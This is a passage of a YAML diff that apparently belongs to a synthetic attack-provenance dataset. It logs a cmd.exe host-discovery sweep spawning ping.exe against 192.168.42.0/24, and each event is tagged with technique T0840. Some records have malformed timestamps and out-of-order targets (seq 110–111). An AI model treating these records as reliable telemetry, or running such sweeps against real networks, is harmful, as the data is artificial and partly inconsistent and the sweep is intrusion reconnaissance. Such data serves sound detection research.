+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.130 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 73
+  timestamp: '2026-03-09T11:03:38Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{44807572-979e-6db9-11e7-9325966d4ab0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.131 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 74
+  timestamp: '2026-03-09T11:03:39Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{22562a2e-6cb0-b894-0bde-745ab7ec9fa9}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.132 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 75
+  timestamp: '2026-03-09T11:03:39Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{0d5d7938-d800-ba49-12ad-c0ce530e9b57}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.133 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 76
+  timestamp: '2026-03-09T11:03:40Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{39a7af4b-30a5-0cab-7fdb-b556c94baf3a}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.134 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 77
+  timestamp: '2026-03-09T11:03:40Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{6a10e898-9f9f-e558-2eb6-ecfbd5a4c167}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.135 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 78
+  timestamp: '2026-03-09T11:03:41Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{54c572c4-082a-c3b4-d3c7-abd9bd15af72}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.136 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 79
+  timestamp: '2026-03-09T11:03:41Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{4eb01499-ffee-ea3a-a448-d22090a0406b}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.137 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 80
+  timestamp: '2026-03-09T11:03:42Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{00b07652-5288-be33-9453-8822efe17d27}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.138 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 81
+  timestamp: '2026-03-09T11:03:42Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{e9f6cb24-030c-2db9-0f08-6fb64d81b2be}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.139 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 82
+  timestamp: '2026-03-09T11:03:43Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{bd874dd9-d150-492b-196b-14aefba7bac8}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.140 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 83
+  timestamp: '2026-03-09T11:03:43Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{ab336b80-f3f1-818c-8e60-52e6e5b1f805}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.141 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 84
+  timestamp: '2026-03-09T11:03:44Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{455408ae-4406-a407-e1c2-709ef9ab9d92}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.142 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 85
+  timestamp: '2026-03-09T11:03:44Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{4f26ab04-ba1e-5f1b-0b95-abf3c98b87be}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.143 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 86
+  timestamp: '2026-03-09T11:03:45Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{9a6b09e7-4acc-4917-af7b-75808475f55d}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.144 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 87
+  timestamp: '2026-03-09T11:03:45Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{65d6ccaf-b38a-9efd-75fc-da9eefed4eca}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.145 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 88
+  timestamp: '2026-03-09T11:03:46Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{dc40dc93-cc6f-fbac-b735-854e098524ac}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.147 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 89
+  timestamp: '2026-03-09T11:03:47Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{3d5c7d1a-d676-4c75-2291-c3ad7abee6c6}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.149 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 90
+  timestamp: '2026-03-09T11:03:48Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{05fad375-7b1f-af11-fa0a-1a646d9fe58b}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.150 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 91
+  timestamp: '2026-03-09T11:03:48Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{044cecfb-29aa-2eef-e9d5-a7d050484c25}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.151 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 92
+  timestamp: '2026-03-09T11:03:49Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{81481834-dabc-f3b6-1fb7-99425e7a6e98}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.152 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 93
+  timestamp: '2026-03-09T11:03:49Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{51e9d51e-221a-5504-f835-ff093f36a455}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.153 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 94
+  timestamp: '2026-03-09T11:03:50Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{3254566d-7f4f-0205-ea9b-e1b21ced18c1}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.154 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 95
+  timestamp: '2026-03-09T11:03:50Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{fc18f61f-a2b2-39c0-5a15-026c991ef1f1}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.155 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 96
+  timestamp: '2026-03-09T11:03:51Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a08ca773-4e02-da99-dde4-d935a55e4dc0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.156 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 97
+  timestamp: '2026-03-09T11:03:51Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{6f786e3e-5c2c-4f8d-87c6-29bea854ae33}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.157 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 98
+  timestamp: '2026-03-09T11:03:52Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{3238bce5-4605-74c5-e903-a25936b054d2}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.158 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 99
+  timestamp: '2026-03-09T11:03:52Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{c3156ef4-cafb-68c2-8b7b-7d7a652c7132}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.159 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 100
+  timestamp: '2026-03-09T11:03:53Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{831e6950-6043-6eb3-4c1b-8d5e48d7c549}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.160 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 101
+  timestamp: '2026-03-09T11:03:55Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{178dfbe0-cf5c-1c76-807c-5c7a286b6085}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.165 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 102
+  timestamp: '2026-03-09T11:03:56Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{827f9df3-b14e-7c71-522f-9e42f15afb71}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.166 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 103
+  timestamp: '2026-03-09T11:03:56Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{1ddc0fd4-439a-b7a4-20a3-46e1d3594a5b}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.167 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 104
+  timestamp: '2026-03-09T11:03:57Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{0cd8886b-0e6e-4494-e0c8-ea1e6eb5d58b}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.168 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 105
+  timestamp: '2026-03-09T11:03:57Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{f855c77a-259b-1346-5cbc-556d07a385be}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.169 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 106
+  timestamp: '2026-03-09T11:03:58Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{ee47d788-cf8f-541f-0024-ca8a27457698}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.170 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 107
+  timestamp: '2026-03-09T11:03:58Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{de95d44d-ae41-85bd-3ae2-cb0ab984e5d4}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.171 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 108
+  timestamp: '2026-03-09T11:03:59Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{382223b5-bb64-0676-ded1-b5ccec29fdaf}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.172 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 109
+  timestamp: '2026-03-09T11:03:59Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a54d09ea-9e58-7216-9930-2bcfdf2364cc}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.173 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 110
+  timestamp: 2026-03-09T11:03Z
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{24e925b4-0596-01d9-0aee-1ec1e953cbb0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.54 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 111
+  timestamp: 2026-03-09T11:03Z
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{d0ea75ef-e5f5-b4d4-7249-48b829325140}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.55 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 112
+  timestamp: '2026-03-09T11:04:01Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7a2f1598-542e-b679-b647-00d0cbf83329}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.176 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 113
+  timestamp: '2026-03-09T11:04:01Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{4c38e947-ccd7-f2fc-6fbb-915d781c8d82}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.177 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 114
+  timestamp: '2026-03-09T11:04:02Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{a5fe4af7-552c-fd4a-f2b2-3bfb1bc395e5}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.178 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 115
+  timestamp: '2026-03-09T11:04:02Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{48faf543-0693-2182-0aa0-c5bf808fe4b7}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.179 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 116
+  timestamp: '2026-03-09T11:04:03Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{926076d1-a85e-35cc-cc95-0d6077c6851e}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.180 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 117
+  timestamp: '2026-03-09T11:04:03Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{67aa9065-f85d-1d77-35a0-7a7fa604c566}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.181 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 118
+  timestamp: '2026-03-09T11:04:04Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{56c55f10-d1b0-afea-eba3-c6a0be5de9ed}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.182 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 119
+  timestamp: '2026-03-09T11:04:04Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{2da57e7c-4954-0ffc-3d02-aa3f7261fc50}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.183 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 120
+  timestamp: '2026-03-09T11:04:05Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{442feaec-ecf2-b00b-9017-9e2c8565d95e}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.184 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 121
+  timestamp: '2026-03-09T11:04:05Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{31d7592f-3eb9-e30a-9422-20551c433e9c}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.185 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 122
+  timestamp: '2026-03-09T11:04:06Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{87118563-c573-f356-bdf3-eef7207c5621}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.186 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 123
+  timestamp: '2026-03-09T11:04:06Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{dfb31159-dcd1-0076-118c-0ce461cf88b2}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.187 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 124
+  timestamp: '2026-03-09T11:04:07Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{423a3297-4e78-70c0-4965-13a8504b8120}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.188 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 125
+  timestamp: '2026-03-09T11:04:07Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{2b622f03-b1e7-902a-3f4b-5a3ad53fb9f9}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.189 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 126
+  timestamp: '2026-03-09T11:04:08Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{17da8859-57cd-1f53-132a-4baaa79a4cb3}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.190 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 127
+  timestamp: '2026-03-09T11:04:08Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{fa4086f3-56ce-bf58-a52e-21f2fdf9ac43}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.191 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 128
+  timestamp: '2026-03-09T11:04:09Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7b26ecaa-0a99-f29c-452a-c34e14e758e3}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.192 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 129
+  timestamp: '2026-03-09T11:04:09Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{095eff6f-63ad-8724-956a-66c86093e0e5}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.193 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 130
+  timestamp: '2026-03-09T11:04:10Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{9824e207-8a97-e2c1-0ce8-94b542e82bdf}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.194 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 131
+  timestamp: '2026-03-09T11:04:10Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{5f0a99da-45b9-e3e6-e2bd-63130cfd0064}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.195 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 132
+  timestamp: '2026-03-09T11:04:11Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{56c035e3-c0e9-3c35-3366-8bd6a139c4cc}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.196 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 133
+  timestamp: '2026-03-09T11:04:11Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{f26eb8a3-1f95-9007-f27b-91694f118333}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.197 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 134
+  timestamp: '2026-03-09T11:04:12Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{24bec4f2-4722-81c0-bc51-7f7fa6cc1581}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.198 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 135
+  timestamp: '2026-03-09T11:04:12Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7c4a4e24-8010-3a85-d3c0-0efea221fa94}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.199 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 136
+  timestamp: '2026-03-09T11:04:13Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{ddf92e39-0247-74db-3c62-447922d4a563}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.200 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 137
+  timestamp: '2026-03-09T11:04:13Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{7d350923-88b0-1efc-b0ee-9c0278863ce0}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.201 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 138
+  timestamp: '2026-03-09T11:04:14Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{81276127-1296-dd82-ca56-e52dc07e123e}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.202 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 139
+  timestamp: '2026-03-09T11:04:14Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{8f6c0632-91bc-9824-7c0a-054266ac32c7}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.203 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 140
+  timestamp: '2026-03-09T11:04:15Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{4b9b93a6-f0a6-a4ea-9fdc-ae83f47b0647}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.204 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 141
+  timestamp: '2026-03-09T11:04:15Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{d230fa9a-7964-d03a-10eb-46e9bbd4db99}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.205 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 142
+  timestamp: '2026-03-09T11:04:16Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{411b7d02-d4b6-fd7a-58fd-ff87d7e446e3}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.206 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 143
+  timestamp: '2026-03-09T11:04:16Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{0dae03c1-e193-0149-f09d-3386b254953f}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.207 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 144
+  timestamp: '2026-03-09T11:04:17Z'
+  rel: CREATE_PROCESS
+  src: '{d4e7d786-38b3-2e17-60ba-d1b8f68b1707}'
+  dst: '{33c26b0b-b98c-2904-a81d-c604dd57e438}'
+  technique: T0840
+  note: Network Connection Enumeration — cmd.exe (recon /24 sweep) spawns ping.exe targeting 192.168.42.208 as part of host
+    discovery loop in 192.168.42.0/24.
+- seq: 145
+  timestamp: '2026-03-09T11:04:17Z'
+  rel: CREATE_PROCESS
